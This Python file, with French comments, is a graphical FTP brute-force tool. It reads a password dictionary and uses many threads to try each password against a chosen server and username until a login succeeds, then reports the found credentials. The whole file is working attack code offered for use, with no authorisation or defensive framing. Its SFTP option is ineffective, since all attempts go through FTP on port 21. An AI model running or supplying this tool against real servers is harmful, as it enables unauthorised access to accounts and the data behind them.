import ftplib
import time
import threading
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
import tkinter as tk
from tkinter import scrolledtext, messagebox
from pathlib import Path
import socket
import os

# initialiser colorama pour les couleurs dans le terminal
init(autoreset=True)

# pour éviter que les logs se chevauchent
print_lock = threading.Lock()
# pour indiquer l'état de l'attaque
password_found = threading.Event()
stop_attack = threading.Event()
executor = None

def try_password(host, username, password, delay=0.1):
    if password_found.is_set() or stop_attack.is_set():
        return None
    time.sleep(delay)  # ajouter un petit délai entre les tentatives
    if password_found.is_set() or stop_attack.is_set():  # vérifier après le délai
        return None
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, 21, timeout=5)  # connexion rapide
        ftp.login(user=username, passwd=password)
        if password_found.is_set() or stop_attack.is_set():  # vérifier après connexion
            ftp.quit()
            return None
        with print_lock:
            log_message(f"Succès ! Nom d'utilisateur : {username}, Mot de passe : {password}", "green")
        password_found.set()
        ftp.quit()
        return (username, password)
    except ftplib.error_perm:
        with print_lock:
            log_message(f"Échec pour le mot de passe : {password}", "red")
    except Exception as e:
        with print_lock:
            log_message(f"Erreur : {e}", "yellow")
    return None

def brute_force_ftp(host, username, password_file, max_workers=10, delay=0.1):
    with open(password_file, 'r') as file:
        passwords = file.read().splitlines()

    global executor
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(try_password, host, username, password, delay) for password in passwords]

        for future in as_completed(futures):
            if stop_attack.is_set():
                break
            result = future.result()
            if result:
                # annuler les futures restantes
                for fut in futures:
                    fut.cancel()
                return result

    if not stop_attack.is_set():
        with print_lock:
            log_message("Aucune combinaison nom d'utilisateur/mot de passe n'a fonctionné.", "red")
    return None

def log_message(message, color):
    output_text.config(state=tk.NORMAL)
    output_text.insert(tk.END, message + "\n", color)
    output_text.config(state=tk.DISABLED)
    output_text.see(tk.END)

def start_brute_force():
    global attack_thread

    host = app.host_entry.get()
    username = app.username_entry.get()
    password_file = app.password_file_entry.get()

    if not host or not username or not password_file:
        messagebox.showerror("Erreur", "Veuillez remplir tous les champs.")
        return

    # nettoyer la boîte de dialogue
    output_text.config(state=tk.NORMAL)
    output_text.delete(1.0, tk.END)
    output_text.config(state=tk.DISABLED)

    port = 21 if app.ftp_var.get() else 22

    stop_attack.clear()
    password_found.clear()

    # désactiver le bouton "Démarrer l'attaque" et activer le bouton "Arrêter l'attaque"
    app.start_button.config(state=tk.DISABLED)
    app.stop_button.config(state=tk.NORMAL)

    attack_thread = threading.Thread(target=check_server_and_start_attack, args=(host, port, username, password_file))
    attack_thread.start()

def check_server_and_start_attack(host, port, username, password_file):
    log_message("Vérification de la disponibilité du serveur FTP...", "blue")
    if not check_server_availability(host, port):
        log_message(f"Le serveur FTP n'est pas dispo ou le port {port} est fermé.", "red")
        stop_brute_force()  # arrêter si le serveur est pas dispo
        return

    log_message("Démarrage de l'attaque bruteforce sur FTP...", "blue")

    result = brute_force_ftp(host, username, password_file)

    if result:
        username, password = result
        log_message(f"Mot de passe trouvé ! Nom d'utilisateur : {username}, Mot de passe : {password}", "green")
    else:
        if not stop_attack.is_set():
            log_message("Aucun mot de passe valide trouvé.", "red")
        else:
            log_message("Attaque arrêtée par l'utilisateur.", "red")
    
    # signaler la fin de l'attaque
    root.after(0, finalize_attack)

def stop_brute_force():
    stop_attack.set()
    if executor:
        executor.shutdown(wait=False)
    # réactiver le bouton "Démarrer l'attaque" et désactiver le bouton "Arrêter l'attaque"
    app.start_button.config(state=tk.NORMAL)
    app.stop_button.config(state=tk.DISABLED)
    log_message("Attaque arrêtée.", "red")

def finalize_attack():
    # réactiver le bouton "Démarrer l'attaque" et désactiver le bouton "Arrêter l'attaque"
    app.start_button.config(state=tk.NORMAL)
    app.stop_button.config(state=tk.DISABLED)

def check_server_availability(host, port):
    try:
        with socket.create_connection((host, port), timeout=5):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False

class FTPBruteforceApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Programme de Bruteforce FTP")

        # ajouter l'icône
        base_dir = os.path.dirname(os.path.abspath(__file__))
        icon_path = os.path.join(base_dir, "logos", "bruteforce_ftp.ico")
        self.root.iconbitmap(icon_path)

        # configurer la fenêtre principale
        self.root.geometry("600x500")

        # chemin par défaut pour le fichier de mots de passe
        self.default_password_file = str(Path(__file__).parent / "dictionnaire_mots_de_passe.txt")

        # ajouter les éléments de l'interface
        tk.Label(self.root, text="Adresse du serveur FTP:").pack(pady=5)
        self.host_entry = tk.Entry(self.root, width=50)
        self.host_entry.pack(pady=5)

        tk.Label(self.root, text="Nom d'utilisateur:").pack(pady=5)
        self.username_entry = tk.Entry(self.root, width=50)
        self.username_entry.pack(pady=5)

        tk.Label(self.root, text="Fichier de mots de passe:").pack(pady=5)
        self.password_file_entry = tk.Entry(self.root, width=50)
        self.password_file_entry.insert(0, self.default_password_file)
        self.password_file_entry.pack(pady=5)

        # cases à cocher pour choisir ftp ou sftp
        protocol_frame = tk.Frame(self.root)
        protocol_frame.pack(pady=5)

        self.ftp_var = tk.BooleanVar(value=True)
        self.sftp_var = tk.BooleanVar(value=False)

        ftp_check = tk.Checkbutton(protocol_frame, text="FTP (21)", variable=self.ftp_var, onvalue=True, offvalue=False, command=lambda: self.sftp_var.set(not self.ftp_var.get()))
        ftp_check.pack(side=tk.LEFT, padx=10)

        sftp_check = tk.Checkbutton(protocol_frame, text="SFTP (22)", variable=self.sftp_var, onvalue=True, offvalue=False, command=lambda: self.ftp_var.set(not self.sftp_var.get()))
        sftp_check.pack(side=tk.LEFT, padx=10)

        self.start_button = tk.Button(self.root, text="Démarrer l'attaque", command=start_brute_force)
        self.start_button.pack(pady=5)

        self.stop_button = tk.Button(self.root, text="Arrêter l'attaque", command=stop_brute_force, state=tk.DISABLED)
        self.stop_button.pack(pady=5)

        global output_text
        output_text = scrolledtext.ScrolledText(self.root, width=80, height=10, state=tk.DISABLED)
        output_text.pack(pady=10)

        # ajouter des styles pour les messages de log
        output_text.tag_config("red", foreground="red")
        output_text.tag_config("green", foreground="green")
        output_text.tag_config("yellow", foreground="orange")
        output_text.tag_config("blue", foreground="blue")

if __name__ == "__main__":
    root = tk.Tk()
    app = FTPBruteforceApp(root)
    root.mainloop()
